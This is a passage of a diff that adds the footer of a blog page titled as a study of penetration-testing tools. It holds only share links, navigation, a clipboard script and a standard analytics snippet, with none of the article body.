+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&is_video=false&description=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透测试工具学习&body=Check out this article: https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&name=渗透测试工具学习&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&t=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Toky
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://y1ng.cc/" target="_blank" rel="noopener">BBS</a></li>
+         
+          <li><a href="https://y1ng.org/TheRoadOfSO/">安全运营之路</a></li>
+         
+          <li><a href="https://cissp-wiki.ml/" target="_blank" rel="noopener">CISSP学习指南</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-157954403-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
